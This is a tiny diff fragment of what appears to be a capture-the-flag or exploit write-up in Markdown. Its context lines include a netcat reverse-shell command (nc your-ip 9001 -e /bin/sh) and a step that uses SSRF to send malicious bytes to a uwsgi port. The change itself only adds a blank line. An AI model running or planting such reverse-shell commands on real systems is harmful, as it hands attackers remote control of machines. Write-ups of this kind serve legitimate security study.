@@ -55,3 +55,4 @@ os.system("nc your-ip 9001 -e /bin/sh")
 6.Use SSRF to send evil bytes to uwsgi port 8000:
 
 ![](https://i.imgur.com/xf0rL0t.png)
+
